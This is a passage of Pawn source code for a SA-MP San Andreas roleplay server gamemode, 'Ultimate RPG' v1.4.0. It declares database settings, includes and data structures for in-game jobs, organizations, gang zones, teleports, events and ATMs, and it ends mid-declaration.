/*
	U L T I M A T E
	Scripter Team - Mumitza x Saco x Ghetoven
	Credits - Momenzi x White
	Gamemode version 1.4.0
*/

#include <a_samp>

#undef MAX_PLAYERS
const MAX_PLAYERS = (200);

#undef MAX_VEHICLES
const MAX_VEHICLES = (2000);

#include <a_mysql>
#include <nex-ac>

#include <SKY>
#include <weapon-config>

#include <Pawn.CMD>
#include <Pawn.Regex>

#include <streamer>
#include <foreach>
#include <sscanf2>
#include <timerfix>
#include <a_zone>
#include <eSelection>
#include <progress2>
#include <TimestampToDate>
#include <mapfix>

//=================================[ MySQL ]==================================//

const MYSQL_STATE = (0);

#if MYSQL_STATE == 0 // LOCALHOST

	static const MYSQL_HOST[10] = "localhost";
	static const MYSQL_USER[5] = "root";
	static const MYSQL_PASS[1] = "";
	static const MYSQL_DB[5] = "u_db";

#elseif MYSQL_STATE == 1 // TEST SERVER

	static const MYSQL_HOST[1] = "";
	static const MYSQL_USER[1] = "";
	static const MYSQL_DB[1] = "";
	static const MYSQL_PASS[1] = "";

#elseif MYSQL_STATE == 2 // LIVE SERVER

	static const MYSQL_HOST[1] = "";
	static const MYSQL_USER[1] = "";
	static const MYSQL_DB[1] = "";
	static const MYSQL_PASS[1] = "";

#endif

new mSQL;

//================================[ Postavke ]================================//

#define VERZIJA_MODA "v1.4.0"
#define MODE_BUILD "build 20"
#define CLIENT_LANGUAGE "Ultimate"
#define SERVER_WEB "www.ultimate-rpg.com"

#define D_NASLOV "{4282C0}(U): {FFFFFF}www.ultimate-rpg.com"
#define LAST_UPDATE "{FFFFFF}UPDATE {4282C0}| 22.02.2020:"

const UKLJUCEN = (1);
const ISKLJUCEN = (0);

const MALE_SKIN = (26);
const FEMALE_SKIN = (169);

new MaleSkinIDs[][] = {26, 29, 28, 137};
new FemaleSkinIDs[][] = {12, 13, 141, 169};

const MAX_POKUSAJ_LOGINA = (3);

const JAIL = (1);
const PRISON = (2);
const MUTE = (3);

const ZIMSKI_MOD = (0);
const XMAS_MOD = (0);
const SMG_DEBUG = (0);

#define PROPERTY_OFFSET(%0) ((((%0)*((%0)<<1))<<2)+65536)
#define ClearChat(%0,%1) for(new x = 0, j = %1; x <= j; x++) SendClientMessage(%0, -1, " ")
#define HOLDING(%0) ((newkeys & (%0)) == (%0))
#define PRESSED(%0) (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define RELEASED(%0) (((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))
    
native IsValidVehicle(vehicleid);

#define gettimeEx(%0,%1,%2) 				gettime(%0,%1,%2); %0 -= 0

//================================[ Objektz ]=================================//

enum
{
	OBJECT_SLOT_1,
	OBJECT_SLOT_2,
	OBJECT_SLOT_3,
	OBJECT_SLOT_4,
	//
	OBJECT_SLOT_NONVEHICLE,
	OBJECT_SLOT_6, //unused
	OBJECT_SLOT_7, //unused
	OBJECT_SLOT_8, //unused
	OBJECT_SLOT_9, //unused
	OBJECT_SLOT_MAIN
};

//================================[ AltChat ]=================================//

#define MAX_LINES 10
new bool:ALTPoruke[MAX_PLAYERS];
new PlayerText:AltChatTD_Player[MAX_LINES],
	AltChatTD_Text[MAX_PLAYERS][MAX_LINES][128];

//================================[ Vatromet ]================================//

const MAX_FIREWORKS = (50);
const MAX_EXPLOSION_OBJS = (30);
const FW_TYPE_RAINBOW = (0);
const FW_TYPE_BLUE = (1);
const FW_TYPE_GREEN = (2);
const FW_TYPE_RED = (3);
const FW_TYPE_WHITE = (4);

enum E_FIREWORK
{
    Float:fw_x,
    Float:fw_y,
    Float:fw_z,
    fw_step,
    fw_max,
    fw_timer,
    fw_mainobj[4],
    fw_obj[MAX_EXPLOSION_OBJS]
}
new FireWork[MAX_FIREWORKS][E_FIREWORK],
	Iterator:iter_FireWork<MAX_FIREWORKS>;

static array_objects[] = 
{
    19281, //white
    19282, //red
    19283, //green
    19284  //blue
};

//===============================[ Selection ]================================//

enum
{
	MENU_SKIN = 1,
	MENU_GLASSES,
	MENU_FBANDANAS,
	MENU_MASKS,
	MENU_CAPS,
	MENU_HATS,
	//
	MENU_GOV_ARMVEST,
	MENU_GOV_HATCAPHELMET
};

static g_aMaleSkins[184] = 
{
	1, 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29,
	30, 32, 33, 34, 35, 36, 37, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 57, 58, 59, 60,
	61, 62, 66, 68, 72, 73, 78, 79, 80, 81, 82, 83, 84, 94, 95, 96, 97, 98, 99, 100, 101, 102,
	103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120,
	121, 122, 123, 124, 125, 126, 127, 128, 132, 133, 134, 135, 136, 137, 142, 143, 144, 146,
	147, 153, 154, 155, 156, 158, 159, 160, 161, 162, 167, 168, 170, 171, 173, 174, 175, 176,
	177, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 200, 202, 203, 204, 206,
	208, 209, 210, 212, 213, 217, 220, 221, 222, 223, 228, 229, 230, 234, 235, 236, 239, 240,
	241, 242, 247, 248, 249, 250, 253, 254, 255, 258, 259, 260, 261, 262, 268, 272, 273, 289,
	290, 291, 292, 293, 295, 296, 297, 299
};

static g_aFemaleSkins[77] = 
{
	9, 10, 11, 12, 13, 31, 38, 39, 40, 41, 53, 54, 55, 56, 63, 64, 65, 69, 75, 76, 77, 85, 88,
	89, 90, 91, 92, 93, 129, 130, 131, 138, 140, 141, 145, 148, 150, 151, 152, 157, 169, 178,
	190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 205, 207, 211, 214, 215, 216, 219,
	224, 225, 226, 231, 232, 233, 237, 238, 243, 244, 245, 246, 251, 256, 257, 263, 298
};

//=================================[ Itemi ]==================================//

enum
{
	ITEM_PIZZA,
	ITEM_SOK,
	ITEM_PIVO,
	ITEM_HAMBI,
	ITEM_RIBA,
	ITEM_LAPTOP,
	ITEM_DROGA,
	ITEM_MATS,
	ITEM_ORUZJE1,
	ITEM_ORUZJE2,
	ITEM_ORUZJE3
};

//================================[ Poslovi ]=================================//

enum
{
	POSAO_NEMA,
	//
	POSAO_MEHANICAR,
	POSAO_PMUNICIJE,
	POSAO_PILOT,
	POSAO_RUDAR,
	POSAO_PNOVCA,
	POSAO_UBERDRIVER,
	POSAO_PNAMJESTAJA
};
const MAX_JOBS = 7;

enum E_JOB_DATA
{
	jName[24],
	jLabel[24],
	jSalary,
	Float:jPos[3],
	Float:jTakeJobPos[3],
	jType,
	jUniformSkin_Male,
	jUniformSkin_Female,
	Float:jUniformPos[3],
	jPickup
};
new jobsInfos[MAX_JOBS][E_JOB_DATA] = 
{
	//NAZIV               		//ZA VEH LABEL 				//PLATA         	//PORT/GPS POZICIJA                	//TAKEJOB POZICIJA                  	//TYPE(id)      		//mSKIN/zSKIN	//UNIFORMA POZICIJA
	{"Mehanicar", 				"MEHANICAR",				8500, 				{1849.8679, -1418.2936, 13.3906}, 	{1828.6383, -1436.6907, 13.5940}, 		POSAO_MEHANICAR, 		0, 0, 			{0.0, 0.0, 0.0}},
	{"Proizvodjac Municije", 	"_", 						3000, 				{874.1498, -1244.1842, 15.3263}, 	{-19.0382,-278.7897,1532.9620}, 		POSAO_PMUNICIJE, 		27, 69, 		{-25.3943,-278.0908,1532.9620}},
	{"Pilot", 					"PILOT", 					12000, 				{1898.9110, -2319.1619, 13.1186}, 	{1892.8370, -2328.5259, 13.5469}, 		POSAO_PILOT, 			61, 69, 		{1891.3441,-2321.0667,13.5469}},
	{"Rudar", 					"_", 						5, 					{593.1714, 857.1762, -43.4550}, 	{624.1611,844.7957,-42.9609}, 			POSAO_RUDAR, 			260, 69, 		{626.8425,841.5934,-42.9609}},
	{"Prevoznik Novca", 		"PREVOZNIK NOVCA", 			16550, 				{1536.6805, -1030.2738, 24.0781},	{1520.6589, -1011.5966, 24.1019}, 		POSAO_PNOVCA, 			71, 141, 		{1530.9215, -1008.2435, 24.1619}},
	{"Uber",					"UBER", 					12000,				{1766.7266, -1890.1396, 13.5602},	{1752.4974, -1894.9723, 13.5574}, 		POSAO_UBERDRIVER,		7, 9,			{1752.4967, -1902.0255, 13.5625}},
	{"Proizvodjac Namjestaja",	"_",						5000,				{874.1498, -1244.1842, 15.3263},	{-2157.8276, 2780.9888, 13.3309},		POSAO_PNAMJESTAJA,		27, 69,			{-2158.2363, 2785.9238, 13.3109}}
};

//

new uberActor[MAX_PLAYERS];

enum E_UBER_DATA 
{
	Float:uberPutnikX,
	Float:uberPutnikY,
	Float:uberPutnikZ,
	Float:uberPutnikA,
	uberPutnikSkin
}
new uberPutnikPos[22][E_UBER_DATA] = {
	//POZICIJA													//SKIN
    {{1859.9891}, {-1064.8330}, {23.8281}, {225.2607}, 			11},
    {{1997.5363}, {-1049.0889}, {24.5780}, {136.8099}, 			19},
    {{2175.6357}, {-1112.4258}, {25.3356}, {170.3474}, 			22},
    {{2171.4282}, {-1390.3838}, {23.9844}, {10.4166}, 			7},
    {{2119.7585}, {-1392.0189}, {23.9930}, {76.9062},			9},
    {{1994.3925}, {-1444.2729}, {13.5661}, {97.0461},			12},
    {{1777.1531}, {-1456.6461}, {13.5469}, {22.5109},			15},
    {{1588.8387}, {-1291.9135}, {17.5246}, {182.8561},			18},
    {{1422.3931}, {-1637.1660}, {13.5469}, {276.9651},			26},
    {{1323.0824}, {-1739.2087}, {13.5469}, {28.4750},			29},
    {{1334.7795}, {-1414.9144}, {13.5519}, {322.4942},			55},
    {{1285.1680}, {-1381.9304}, {13.5451}, {104.8980},			56},
    {{1149.8275}, {-1388.8518}, {13.8324}, {177.7135},			58},
    {{976.2339}, {-1313.5206}, {13.5298}, {191.7454},			59},
    {{968.4011}, {-1155.9991}, {23.8493}, {6.9686},				69},
    {{1063.8440}, {-1133.7581}, {23.8281}, {186.0560},			79},
    {{1038.4362}, {-946.4205}, {42.7692}, {191.7885},			90},
    {{771.1581}, {-1040.1145}, {24.1100}, {189.4339},			91},
    {{620.9304}, {-1299.5890}, {15.1206}, {269.4071},			136},
    {{663.6447}, {-1760.5327}, {13.6231}, {346.2188},			137},
    {{433.5820}, {-1779.4293}, {5.5469}, {2.7461},				154},
    {{265.7579}, {-1740.7675}, {4.2613}, {355.6270},			177}
};

static Float:uberPutnikHomePos[][3] = {
    {1679.7350, -2118.9468, 13.5469},
    {1858.6698, -2045.7493, 13.5469},
    {2465.2346, -2017.1334, 13.5469},
    {2520.2266, -2002.7635, 13.5469},
    {2489.1438, -1953.6691, 13.4233},
    {2653.5313, -1995.9801, 13.5547},
    {2646.2280, -2022.1116, 13.5469},
    {2776.8606, -1971.1808, 13.5419},
    {2744.9734, -1401.3511, 35.6938},
    {2744.0776, -1223.6433, 64.0152},
    {2715.0764, -1227.9386, 63.2551},
    {2598.3694, -1249.2747, 47.4448},
    {2505.5706, -1249.0613, 35.0547},
    {2443.4448, -1303.7654, 24.0000},
    {2239.6870, -1226.3049, 23.9690},
    {2146.3425, -1295.4978, 23.9792},
    {2007.4325, -1130.2563, 25.2921},
    {1345.5444, -1065.4747, 26.1449},
    {1254.5010, -1098.4070, 25.9161},
    {1232.1757, -1025.7750, 32.4078},
    {1155.2968, -1100.3542, 25.1939},
    {1063.2871, -1469.5795, 13.5479},
    {910.1512, -1474.8025, 13.5488},
    {540.9529, -1200.9355, 44.3809},
    {475.2441, -1176.5809, 63.2028},
    {569.8581, -1133.2944, 50.4884},
    {689.9090, -1022.0699, 51.4822},
    {785.1899, -807.6539, 65.3884},
    {921.3284, -672.5261, 117.9474},
    {1057.6736, -623.3417, 116.4565},
    {1349.5824, -618.7880, 109.1328},
    {1497.0015, -700.8770, 94.7500},
    {1511.6466, -772.4894, 80.9420},
    {1524.2065, -812.6230, 71.2968},
    {1425.6833, -878.1877, 50.3836},
    {834.2838, -868.4387, 68.9199}
};

new NamjestajObject[MAX_PLAYERS],
	NamjestajColorObject[MAX_PLAYERS];

//

static Float:RandomAmmoPos[][4] =
{
	{-28.0300,-262.9054,1529.5376,268.0383},
	{-28.0293,-265.9607,1529.5376,268.6650},
	{-24.6352,-265.8534,1529.5376,89.1466},
	{-24.6358,-262.7455,1529.5376,89.4600},
	{-24.6349,-259.6543,1529.5376,89.1466},
	{-23.0176,-259.7810,1529.5376,269.0017},
	{-23.0170,-262.9241,1529.5376,270.5684},
	{-23.0175,-265.9813,1529.5376,269.6284},
	{-19.6245,-265.8538,1529.5376,88.2301},
	{-19.6244,-262.7229,1529.5376,88.5434},
	{-19.6231,-259.6740,1529.5376,89.7967},
	{-22.5285,-274.0121,1529.5376,179.7243},
	{-23.2358,-280.1036,1529.5376,358.3259},
	{-16.3162,-274.0116,1529.5376,179.4343},
	{-19.8612,-274.0120,1529.5376,178.4943},
	{-19.8115,-280.1017,1529.5376,358.0126},
	{-17.2127,-280.1015,1529.5376,359.8926}
};

static Float:AmmoBoxPos[][6] = 
{ 
	{-27.223754, -263.024169, 1529.598632, 0.000000, 0.000000, -89.999977}, 
	{-27.223754, -266.097167, 1529.598632, 0.000000, 0.000000, -89.999977}, 
	{-25.503173, -265.776855, 1529.598632, 0.000000, 0.000000, 450.000000}, 
	{-25.503173, -262.616699, 1529.598632, 0.000000, 0.000000, 450.000000}, 
	{-25.503173, -259.564453, 1529.598632, 0.000000, 0.000000, 450.000000}, 
	{-22.162719, -259.904785, 1529.598632, 0.000000, 0.000000, 630.000000}, 
	{-22.162719, -263.046142, 1529.598632, 0.000000, 0.000000, 630.000000}, 
	{-22.162719, -266.088989, 1529.598632, 0.000000, 0.000000, 630.000000}, 
	{-20.481079, -265.748657, 1529.598632, 0.000000, 0.000000, 810.000000}, 
	{-20.481079, -262.618408, 1529.598632, 0.000000, 0.000000, 810.000000}, 
	{-20.481079, -259.558349, 1529.598632, 0.000000, 0.000000, 810.000000}, 
	{-22.631103, -274.788208, 1529.598632, 0.000000, 0.000000, 1260.000000}, 
	{-23.122680, -279.288696, 1529.598632, 0.000000, 0.000000, 1080.000000}, 
	{-16.410034, -274.788208, 1529.598632, 0.000000, 0.000000, 1260.000000}, 
	{-19.989990, -274.788208, 1529.598632, 0.000000, 0.000000, 1260.000000}, 
	{-19.681762, -279.288696, 1529.598632, 0.000000, 0.000000, 1080.000000}, 
	{-17.160766, -279.288696, 1529.598632, 0.000000, 0.000000, 1080.000000} 
};
new MunicijaObject[MAX_PLAYERS];

//=================================[ Posao Skills ]============================//

enum JobsSkillsData {
	skill_Mehanicar,
	skill_PMunicije,
	skill_Pilot,
	skill_Rudar,
	skill_PNovca,
	skill_Uber,
	skill_PNamjestaja
}
new jskInfo[MAX_PLAYERS][JobsSkillsData];

//=================================[ Quests ]==================================//

enum QuestData {
	bool:qt_EasyQuest[10],
	bool:qt_EasyRewardQuest[10]
}
new questInfo[MAX_PLAYERS][QuestData];

//=================================[ Ports ]==================================//

const MAX_PORTS = 20;

enum tpData 
{
	tpNaziv[25],
	Float:tpPosX,
	Float:tpPosY,
	Float:tpPosZ,
	tpVIP,
	tpPromoter,
	tpYouTuber
};
new portInfo[MAX_PORTS][tpData] = 
{
	//NAZIV               		   				//LOKACIJA              			    //VIP 		//PROMOTER 		//YOUTUBER
	{"A/GM Baza", 								{4303.3457}, {3027.1594}, {5.2321}, 	99,			99,				99},
	{"V/P/YT Baza", 							{860.2669}, {-1663.7114}, {13.5468}, 	1,			1,				1},
	{"Spawn - Aerodrom", 						{1547.9138}, {-2286.7732}, {13.1700}, 	1,			1,				1},
	{"Opstina", 								{1474.4249}, {-1723.2360}, {13.5469}, 	1,			1,				1},
	{"Banka", 									{1469.6525}, {-1046.0811}, {23.8281}, 	1,			1,				1},
	{"Zlatara/Dijamant Store", 					{2018.6461}, {-1254.4033}, {23.9844}, 	2,			2,				99},
	{"Bolnica", 								{1210.4511}, {-1321.7767}, {13.3984}, 	2,			2,				99},
	{"Igraonica", 								{1279.2339}, {-1308.7339}, {13.3446}, 	2,			2,				99},
	{"Salon Vozila", 							{556.2736}, {-1244.5571}, {16.5712}, 	2,			2,				99},
	{"Oglasi", 									{1714.6606}, {-1341.9164}, {13.3828}, 	3,			3,				99},
	{"Auto Skola", 								{2502.4441}, {-1926.0791}, {13.5469}, 	3,			3,				99},
	{"Lutrija", 								{1295.0535}, {-1537.3029}, {13.5333}, 	3,			3,				99},
	{"Crno Trziste",							{199.5335}, {-237.6040}, {2.6083}, 		4,			99,				99},
	{"Hangar", 									{2437.3105}, {-2440.0042}, {13.6250}, 	4,			99,				99},
	{"Plaza", 									{220.4795}, {-1863.1206}, {2.9754}, 	4,			99,				99},
	{"Bandera Srece", 							{1135.7046}, {-951.4317}, {42.2323}, 	4,			99,				99},
	{"LS - Los Santos", 						{1315.0231}, {-727.5245}, {92.8225}, 	5,			99,				99},
	{"LV - Las Venturas", 						{2515.0380}, {1372.7479}, {10.6718}, 	5,			99,				99},
	{"SF - San Fierro", 						{-2249.2810}, {-77.2153}, {35.1796}, 	5,			99,				99},
	{"Deagle Event", 							{-1736.3834}, {-1170.3705}, {3.9841}, 	99,			99,				99}
};
 
//================================[ PAKETI ]==================================//

const MAX_PAKETI = 8;

enum paketData
{
	p_loc_name[32],
	Float:p_p_pos[3]
};

new paketInfo[MAX_PAKETI][paketData] = 
{
	//NAZIV 						//LOKACIJA
    {"SF, Skladiste", 				{-2186.3853, -261.0611, 36.5156}},
    {"LV, Gradiliste", 				{2475.7634, 1873.5973, 10.6037}},
    {"LV, Stari Aerodrom", 			{235.6651, 2635.7061, 17.4134}},
    {"Angel Pine Skladiste", 		{-2113.1272, -2407.9885, 31.3013}},
    {"SF, Lovacka Kucica", 			{-1631.7358, -2244.7502, 31.4766}},
    {"LS-LV, Most", 				{1646.2881, 244.1460, 19.5664}},
    {"Palomino Creek, Plaza", 		{2160.9465, -102.2438, 2.7500}},
    {"LS, Dokovi", 					{2837.8542, -2364.0894, 31.0039}}
};

new Float:PaketNewPos[3];

//=================================[ TIKI ]==================================//

const MAX_TIKI = 100;

enum E_TIKI
{
	tID,
	Float:tPosX,
	Float:tPosY,
	Float:tPosZ
}
new TikiInfo[MAX_TIKI][E_TIKI],
	Iterator:iter_Tiki<MAX_TIKI>;

enum TIKI_DATA
{
	Float:tPosX,
	Float:tPosY,
	Float:tPosZ,
	bool:tPokupljen,
	tObject,
	Text3D:t3D
}
new TikiData[TIKI_DATA];

//=================================[ Gift ]===================================//

const MAX_GIFT = 20;

enum gift_enum 
{
	gObjekt,
	Text3D:gLabel,
	Float:gPosX,
	Float:gPosY,
	Float:gPosZ
}
new GiftInfo[MAX_GIFT][gift_enum],
	Iterator:iter_Gift<MAX_GIFT>;

//================================[ ASKQ ]====================================//

const MAX_ASKQS = 50;

enum askqData {
    bool:askqSend,
    askqOwner[MAX_PLAYER_NAME],
    askqID,
	askqQuestion[128]
};
new askqList[MAX_ASKQS][askqData];

enum askqDataA {
	bool:askqSended,
    bool:askqAnswered,
    askqAdmin[MAX_PLAYER_NAME],
	askqAnswer[128]
};
new askqInfo[MAX_PLAYERS][askqDataA];

//==================================[ GPS ]===================================//

const MAX_GPS =	100;

enum gpsData {
	gpsSQLID,
	gpsName[50],
	Float:gpsPos[3]
};
new gpsInfo[MAX_GPS][gpsData],
	Iterator:iter_GPS<MAX_GPS>;

enum {
	GPS_TYPE_VAZNEL = 1,
	GPS_TYPE_OSTALO
};

enum {
	MAPPED_NONE = -1,
	MAPPED_IMPORTANT = 0,
	MAPPED_HOUSE,
	MAPPED_BUSINESS,
	MAPPED_JOB,
	MAPPED_QUESTS
};
new pMappedType[MAX_PLAYERS] = {MAPPED_NONE, MAPPED_NONE, MAPPED_NONE, ...};

enum _pgr {
	_pgrIconId,
	Float:_pgrPos[3],
	_pgrCheckPointId,
	_pgrObject
}
new PlayerGpsRadar[MAX_PLAYERS][_pgr];
static bool:KoristimGPS[MAX_PLAYERS];

//===============================[ GangZone ]=================================//

const MAX_GZONE = 50;

enum gZoneData 
{
	gZone_ID,
	gZoneTaken,
	gZoneTakeable,
	gZoneGangSQLID,
	gZoneGangID,
	gZoneTime,
	Float:gZoneMaxX,
	Float:gZoneMinX,
	Float:gZoneMaxY,
	Float:gZoneMinY,
	gZoneColor[24],
	gZoneIsSpecial,
	//
    Text3D:gZone3D,
    gZonePickup,
    Float:gZonePickup_X,
    Float:gZonePickup_Y,
    Float:gZonePickup_Z,
    gZoneID,
    gZoneRectAngle
};
new gZoneInfo[MAX_GZONE][gZoneData],
	Iterator:iter_gZone<MAX_GZONE>;

new CreatingGZone[MAX_PLAYERS],
	CreatingGZoneID[MAX_PLAYERS],
	gZone_gID[MAX_PLAYERS],
	gZone_Time[MAX_PLAYERS],
	gZone_ShowTeammates[MAX_PLAYERS] = 10,
	gZone_Timer[MAX_PLAYERS],
	Float:CreatingPos[ MAX_PLAYERS ][ 4 ];

//===============================[ Jelke ]====================================//

const MAX_CTREES =    													    100;

enum C_Tree 
{
	ctSQLID,
	bool:ctPlaced,
	Float:ctPos[6],
	//
	ctObject,
	Text3D:ct3d
};
new CTree[MAX_CTREES][C_Tree],
	Iterator:iter_CTree<MAX_CTREES>;

//==============================[ Pokloni ]===================================//

const MAX_PRESENTS =     													200;

enum Presents 
{
	presSQLID,
	bool:presPlaced,
	bool:presTaken,
	Float:presPos[6],
	//
	Text3D:pres3d,
	presObject
};
new presentsInfo[MAX_PRESENTS][Presents],
	Iterator:iter_Present<MAX_PRESENTS>;

//==============================[ Organizacije ]==============================//

const MAX_ORG = 25;
const ORG_IME = 40;
const ORG_RANK = 30;

enum 
{
	ORG_TIP_VLADINA = 1,
	ORG_TIP_BANDA,
	ORG_TIP_MAFIJA,
	ORG_TIP_BAJKERI,
	ORG_TIP_HITMAN
};

enum oOrgInfo 
{
	oID,
	oName[ORG_IME],
	oPreFix[5],
	oColor[7],

	oTip,
	oSuspended,
	oMaxClanova,
    oUbacenihClanova,

    oSkin1,
	oSkin2,
	oSkin3,
	oSkin4,
	oSkin5,
	oSkin6,

	oZSkin1,
	oZSkin2,
	oZSkin3,
	oZSkin4,
	oZSkin5,
	oZSkin6,

	oRank1[ORG_RANK],
	oRank2[ORG_RANK],
	oRank3[ORG_RANK],
	oRank4[ORG_RANK],
	oRank5[ORG_RANK],
	oRank6[ORG_RANK],

	Float:oPozExtX,
	Float:oPozExtY,
	Float:oPozExtZ,

	Float:oPozIntX,
	Float:oPozIntY,
	Float:oPozIntZ,

    oInt,
	oVw,

    Float:oSpawnPoint[3],

    Float:oDiler[4],
    oDilerCena,
	bool:oDilerRadi,

	Float:oDutyPoint[3],
	oDutyInt,
	oDutyVW,
	Float:oEquipPoint[3],
	oEquipInt,
	oEquipVW,

    oSavez,

    oMaxPort,

	Float:oSafePos[3],
	oSafeMoney,
	oSafeDrugAmmount,
	oSafeMats,

	oBussinesID,
	oEntFromBussines,
	oEntInt,
	oEntVw,

	Float:oPortX,
	Float:oPortY,
	Float:oPortZ,
	Float:oPortA,

	//dont save
	oMapIcon,
	oPickup,
	oDutyPickup,
	oEquipPickup,
	oSafePickup,
	Text3D:o3D,
	Text3D:oDuty3D,
	Text3D:oSafe3D,
	Text3D:oEquip3D,
	Text3D:oDiler3D,
	oDilerActor
}
new org_info[MAX_ORG][oOrgInfo];

enum org_members_data 
{
	o_m_Name[MAX_PLAYER_NAME],
	o_m_type,
	o_m_sqlID
}
new org_members_info[MAX_ORG][52][org_members_data];

//===============================[ Kapije ]===================================//

const MAX_GATES = 30;

enum gate_Data 
{
	gatebaseID,
	gateOwner[MAX_PLAYER_NAME],
	bool:gateOpened,
	gateFor,
	gateOrgID,
	gateModel,
	Float:gateSpeed,
	Float:gateRadius,
	gateTime,
	Float:gatePos[6],
	gateInterior,
	gateWorld,
	Float:gateMove[6],
	//
	gateObject,
	gateTimer
};
new GateData[MAX_GATES][gate_Data],
	Iterator:iter_Gate<MAX_GATES>;

new EditDGate[MAX_PLAYERS],
    EditDGateMove[MAX_PLAYERS];

//==================================[ WAR ]===================================//

const MAX_WARS = 20;

enum WAR 
{
	bool:WARKreiranje,
    bool:WARAktivan,
	WARTimSkor[2],
	WAROruzje[4],
	WARMapa,
	WARMaxClanova,
	WARTimClanovi[2],
	WARTimLider[2],
	WARTimer,
	WARTeamID[2],
	TimerWARSec,
	TimerWARMin,
	TimerWAROstaloVreme,
	WARCena
}
new WARInfo[MAX_WARS][WAR];

enum WARI 
{
	bool:WARTim[2],
	WARUbistva,
	WARSmrti,
	WARIgrac
}
new WARPInfo[MAX_PLAYERS][WARI];

//=========================[ TDM INTERNET CAFFE ]=============================//

const TDM_MAX_MAPS = 5;

enum tdm_mapsInfos {
	tdmID,
	mName[ 64 ],
	Float:ctPos[ 3 ],
	Float:ctPos1[ 3 ],
	Float:ctPos2[ 3 ],
	Float:ttPos[ 3 ],
	Float:ttPos1[ 3 ],
	Float:ttPos2[ 3 ],
	mInt,
	mVW,
	ctScore,
	ttScore,
	ctPlayers,
	ttPlayers,
	mMinut,
	mSekunda
};
new mTimer,
	mOstaloVreme;

new tdm_mapInfo[ TDM_MAX_MAPS ][ tdm_mapsInfos ] = {
	{ 0, "de_IceWorld",
		{ 1582.3817, -8838.1582, 9.9582 },
		{ 1571.3018, -8840.9541, 9.9582 },
		{ 1584.5598, -8826.1172, 9.9582 },
		{ 1513.2052, -8778.9570, 9.9638 },
		{ 1520.9518, -8773.3965, 9.9638 },
		{ 1531.6151, -8773.5820, 9.9638 },
			0, 0, 0, 0, 0, 0, 1, 0 },

	{ 1, "de_dust2",
		{ 7746.1831, -2565.9768, 18.4135 },
		{ 7736.9487, -2568.9768, 18.4057 },
		{ 7742.6733, -2555.5806, 18.4081 },
		{ 7710.2993, -2656.9937, 18.3768 },
		{ 7709.8916, -2651.2898, 18.3768 },
		{ 7700.6040, -2637.0930, 18.4302 },
			0, 0, 0, 0, 0, 0, 1, 0 },

	{ 2, "de_train",
		{ -4188.9097, -6781.5454, 11.9720 },
		{ -4188.5249, -6770.1045, 11.9720 },
		{ -4186.6250, -6785.5361, 11.9720 },
  		{ -4440.6260, -6777.2075, 17.5719 },
  		{ -4438.6587, -6758.7808, 17.5719 },
  		{ -4449.6919, -6770.5693, 16.1092 },
			0, 0, 0, 0, 0, 0, 1, 0 },

	{ 3, "cs_Assault",
		{ 8078.9253, -7592.4277, 15.3666 },
		{ 8073.6328, -7589.6387, 15.3666 },
		{ 8069.4434, -7588.6870, 15.3666 },
  		{ 8165.1001, -7569.8096, 15.3666 },
  		{ 8150.9644, -7572.4585, 15.3666 },
  		{ 8159.8574, -7566.1240, 15.3666 },
			0, 0, 0, 0, 0, 0, 1, 0},

	{ 4, "de_Inferno",
		{ 9431.5811, -8750.5869, 28.3405 },
		{ 9427.5322, -8750.5098, 28.6790 },
		{ 9434.2627, -8745.8184, 28.1084 },
  		{ 9579.5615, -8779.4414, 23.0410 },
  		{ 9581.1582, -8764.7627, 23.0410 },
  		{ 9578.2207, -8746.7861, 23.0391 },
			0, 0, 0, 0, 0, 0, 1, 0 }
};

enum tdm_pi 
{
	tdm_selectionNumber,
	tdm_Team,
	tdm_Kill,
	tdm_KillinaROW,
	tdm_Death
}
new tdm_player_info[ MAX_PLAYERS ][ tdm_pi ];
new tdm_ServerMap;

//============================================================================//

stock const Special_Users[][] = 
{
    { "Saco" },
    { "Kristijan" },
    { "Ghetoven" },
    { ".momenzi" }
};

//==============================[ RPORUKE ]===================================//

new RandomSPoruke[20][99] =
{
    "U-Poruke: ~w~Dobrodosli na Ultimate RPG. Zelimo vam ugodnu igru.",
    "U-Poruke: ~w~Posjetite nas forum da budete u toku sa novostima.",
    "U-Poruke: ~w~Nas instagram je: ultimate_rpg",
    "U-Poruke: ~w~Nas facebook je: fb.com/UltimateCommunity",
    "U-Poruke: ~w~Spisak svih komandi pogledajte komandom '/help'.",
    "U-Poruke: ~w~Za lokacije u gradu koristite gps sistem: '/gps'.",
    "U-Poruke: ~w~Sve potrebne stvari mozete naci u prodavnici '24/7'.",
    "U-Poruke: ~w~Trenutno igrate na v1.4.0 verziji by Saco x Ghetoven.",
    "U-Poruke: ~w~Neko krsi pravila? Prijavite ga komandom '/report'.",
    "U-Poruke: ~w~Ukoliko vam je potrebna pomoc obratite se komandom '/askq'.",
    "U-Poruke: ~w~Listu gamemastera mozete vidjeti komandom '/gamemasteri'.",
	"U-Poruke: ~w~Svaki vid vredjanja drugih igraca se kaznjava.",
	"U-Poruke: ~w~Postujte druge igrace kako bi oni postovali vas.",
	"U-Poruke: ~w~Sve vezano za donacije imate na forumu.",
	"U-Poruke: ~w~Sve novosti na nasoj skripti pogledajte komandom '/update'.",
	"U-Poruke: ~w~Poslednji update servera 10.01.2020.",
    "U-Poruke: ~w~Ako ste novi na serveru i treba vam pomoc koristite '/new'.",
	"U-Poruke: ~w~Koristite nas voice chat: '/discord'.",
	"U-Poruke: ~w~Za odredjene poslove potrebna vam je odredjena dozvola: '/buylic'.",
	"U-Poruke: ~w~Fakture za firmu kupujete u opstini."
};

//===============================[ Kontejneri ]===============================//

const MAX_KONT = 														    100;

enum kont 
{
	koSQLID,
	Float:koObjPos[ 3 ],
	Float:koObjRot[ 3 ],
	//
	koObjID
}
new KontInfo[ MAX_KONT ][ kont ],
	Iterator:iter_Kont<MAX_KONT>;

//===============================[ Bankomati ]================================//

const MAX_ATM = 															100;

enum atmDataa 
{
	atmSQLID,
	bool:atmPreseceneZice,
	bool:atmProbijenBios,
	atmVremeDoRoba,
	Float:atmPos[6],
	atmObject,
	Text3D:atmText3D
};
new atmInfo[ MAX_ATM ][ atmDataa ],
	Iterator:iter_ATM<MAX_ATM>;

new robbingATMSeconds[ MAX_PLAYERS ],
